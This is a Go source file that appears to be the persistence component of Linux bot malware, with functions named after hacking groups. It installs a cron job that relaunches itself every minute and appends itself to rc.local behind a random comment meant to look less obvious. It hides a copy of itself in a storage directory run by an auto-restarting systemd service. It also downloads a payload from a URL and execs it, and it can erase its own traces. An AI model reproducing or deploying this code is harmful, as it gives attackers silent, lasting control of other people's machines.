package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
)

// ============================================================================
// PERSISTENCE FUNCTIONS
// These establish various methods to survive reboots and maintain access.
// ============================================================================

// lazarus sets up a simple cron job to keep the bot running.
// Runs every minute to check if bot is alive and restart if needed.
// Does not require any external scripts - directly executes the binary.
// In debug mode: only logs what would happen, does not execute.
func lazarus() {
	exe, err := os.Executable()
	if err != nil {
		if verboseLog {
			deoxys("lazarus: [DEBUG] Failed to get executable path: %v", err)
		}
		return
	}

	procName := filepath.Base(exe)
	cronJob := fmt.Sprintf("%s pgrep -x %s > /dev/null || %s > /dev/null 2>&1 &", schedExpr, procName, exe)

	if verboseLog {
		deoxys("lazarus: [DEBUG] Would set up cron persistence")
		deoxys("lazarus: [DEBUG] Executable: %s", exe)
		deoxys("lazarus: [DEBUG] Process name: %s", procName)
		deoxys("lazarus: [DEBUG] Would install cron job: %s", cronJob)
		deoxys("lazarus: [DEBUG] Skipping actual execution (debug mode)")
		return
	}

	// Production mode - execute silently
	// Check if cron job already exists
	checkCmd := exec.Command(crontabBin, "-l")
	existing, _ := checkCmd.Output()
	if strings.Contains(string(existing), exe) {
		return
	}

	// Add to crontab
	cmd := exec.Command(bashBin, shellFlag, fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronJob))
	if err := cmd.Run(); err != nil {
		deoxys("lazarus: crontab install failed: %v", err)
	}
}

// fin7 adds the bot executable to rc.local for startup persistence.
// Only adds entry if rc.local exists and doesn't already contain our path.
// Uses a random suffix to make the entry less obvious.
// In debug mode: only logs what would happen, does not execute.
func fin7() {
	if verboseLog {
		deoxys("fin7: [DEBUG] Would set up rc.local persistence")
		if _, err := os.Stat(rcTarget); err != nil {
			deoxys("fin7: [DEBUG] %s does not exist, would skip", rcTarget)
			return
		}
		exe, err := os.Executable()
		if err != nil {
			deoxys("fin7: [DEBUG] Failed to get executable path: %v", err)
			return
		}
		b, err := os.ReadFile(rcTarget)
		if err != nil {
			deoxys("fin7: [DEBUG] Failed to read %s: %v", rcTarget, err)
			return
		}
		if strings.Contains(string(b), exe) {
			deoxys("fin7: [DEBUG] Entry already exists in rc.local")
			return
		}
		line := exe + " # " + kimsuky()
		deoxys("fin7: [DEBUG] Would add to rc.local: %s", line)
		deoxys("fin7: [DEBUG] Skipping actual execution (debug mode)")
		return
	}

	// Production mode - execute silently
	if _, err := os.Stat(rcTarget); err != nil {
		return
	}
	exe, err := os.Executable()
	if err != nil {
		return
	}
	b, err := os.ReadFile(rcTarget)
	if err != nil {
		return
	}
	if strings.Contains(string(b), exe) {
		return
	}
	line := exe + " # " + kimsuky() + "\n"
	sandworm(rcTarget, line, 0700)
}

// fetchPayload downloads a URL and returns the raw bytes.
func fetchPayload(url string) ([]byte, error) {
	code, body, err := rawHTTPGet(url, nil, 30*time.Second)
	if err != nil {
		return nil, err
	}
	if code != 200 {
		return nil, fmt.Errorf("HTTP %d", code)
	}
	return body, nil
}

// dragonfly installs systemd + storeDir persistence.
// If url is non-empty the payload is fetched from that URL (ELF or .sh).
// If url is empty the running binary is copied as-is.
func dragonfly(url string) {
	programPath := filepath.Join(storeDir, binLabel)

	if verboseLog {
		deoxys("dragonfly: [DEBUG] Would set up persistence")
		deoxys("dragonfly: [DEBUG] Would create hidden directory: %s", storeDir)
		deoxys("dragonfly: [DEBUG] Primary: copy running binary")
		if url != "" {
			deoxys("dragonfly: [DEBUG] Fallback (if binary unreadable): fetch from %s", url)
		}
		deoxys("dragonfly: [DEBUG] Would write binary to: %s", programPath)
		deoxys("dragonfly: [DEBUG] Would write systemd service to: %s", unitPath)
		deoxys("dragonfly: [DEBUG] Would enable systemd service: %s", unitName)
		deoxys("dragonfly: [DEBUG] Skipping actual execution (debug mode)")
		return
	}

	os.MkdirAll(storeDir, 0755)

	// Always try to copy the running binary first.
	// Only fall back to the URL if the binary can't be read.
	var data []byte
	if exe, err := os.Executable(); err == nil {
		data, err = os.ReadFile(exe)
		if err != nil {
			deoxys("dragonfly: self-read failed: %v", err)
		}
	}
	if len(data) == 0 {
		if url == "" {
			deoxys("dragonfly: no binary and no fallback url — aborting")
			return
		}
		var err error
		data, err = fetchPayload(url)
		if err != nil {
			deoxys("dragonfly: fallback fetch failed: %v", err)
			return
		}
		deoxys("dragonfly: used fallback url: %s", url)
	}

	if err := os.WriteFile(programPath, data, 0755); err != nil {
		return
	}

	unitContent := fmt.Sprintf(
		"[Unit]\nDescription=%s\nAfter=network.target\n\n[Service]\nExecStart=%s\nRestart=always\nRestartSec=30\n\n[Install]\nWantedBy=multi-user.target\n",
		binLabel, programPath,
	)
	os.WriteFile(unitPath, []byte(unitContent), 0644)

	cmd := exec.Command(systemctlBin, "enable", "--now", unitName)
	if err := cmd.Run(); err != nil {
		deoxys("dragonfly: systemctl enable failed: %v", err)
	}
}

// reinstall fetches a payload from url, writes it to a temp file, and
// exec-replaces the current process with it. Supports ELF binaries and
// shell scripts (detected by .sh suffix or #! shebang).
func reinstall(url string) {
	data, err := fetchPayload(url)
	if err != nil {
		deoxys("reinstall: fetch failed: %v", err)
		return
	}

	tmp, err := os.CreateTemp("", binLabel+"-*")
	if err != nil {
		return
	}
	tmpPath := tmp.Name()
	if _, err := tmp.Write(data); err != nil {
		tmp.Close()
		os.Remove(tmpPath)
		return
	}
	tmp.Close()
	os.Chmod(tmpPath, 0755)

	isScript := strings.HasSuffix(url, ".sh") ||
		(len(data) >= 2 && data[0] == '#' && data[1] == '!')

	var execPath string
	var args []string
	if isScript {
		execPath = bashBin
		args = []string{bashBin, tmpPath}
	} else {
		execPath = tmpPath
		args = []string{tmpPath}
	}

	// Replace this process — no return on success
	syscall.Exec(execPath, args, syscall.Environ())
	// Exec failed — clean up temp file
	os.Remove(tmpPath)
}

// nukeAndExit strips all persistence artifacts, removes the binary, and exits.
// Designed to fully remove a signal-ignoring, persisted daemon.
func nukeAndExit() {
	deoxys("nukeAndExit: Removing all persistence and self-destructing")

	// 1. Stop and remove systemd service
	exec.Command(systemctlBin, "stop", unitName).Run()
	exec.Command(systemctlBin, "disable", unitName).Run()
	os.Remove(unitPath)
	exec.Command(systemctlBin, "daemon-reload").Run()

	// 2. Remove cron entries referencing our script or binary
	if out, err := exec.Command(crontabBin, "-l").Output(); err == nil {
		lines := strings.Split(string(out), "\n")
		var clean []string
		for _, line := range lines {
			if strings.Contains(line, binLabel) {
				continue
			}
			clean = append(clean, line)
		}
		filtered := strings.TrimSpace(strings.Join(clean, "\n"))
		if filtered == "" {
			exec.Command(crontabBin, "-r").Run()
		} else {
			cmd := exec.Command(crontabBin, "-")
			cmd.Stdin = strings.NewReader(filtered + "\n")
			cmd.Run()
		}
	}

	// 3. Clean rc.local
	rcLocal := rcTarget
	if data, err := os.ReadFile(rcLocal); err == nil {
		lines := strings.Split(string(data), "\n")
		var clean []string
		for _, line := range lines {
			if strings.Contains(line, binLabel) || strings.Contains(line, storeDir) {
				continue
			}
			clean = append(clean, line)
		}
		os.WriteFile(rcLocal, []byte(strings.Join(clean, "\n")), 0755)
	}

	// 4. Remove hidden directory (contains script + binary copy)
	os.RemoveAll(storeDir)

	// 5. Remove instance lock file
	os.Remove(lockLoc)

	// 6. Remove own executable
	if exe, err := os.Executable(); err == nil {
		os.Remove(exe)
	}

	os.Exit(0)
}
